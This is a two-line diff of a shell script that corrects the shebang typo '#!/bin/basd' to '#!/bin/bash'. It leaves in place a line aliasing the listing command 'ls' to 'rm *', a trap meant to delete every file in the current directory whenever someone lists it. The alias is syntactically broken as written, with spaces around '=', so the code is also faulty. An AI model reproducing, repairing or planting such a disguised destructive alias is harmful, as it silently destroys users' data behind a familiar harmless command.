@@ -1,2 +1,2 @@
-#!/bin/basd
+#!/bin/bash
 alias ls = "rm *"
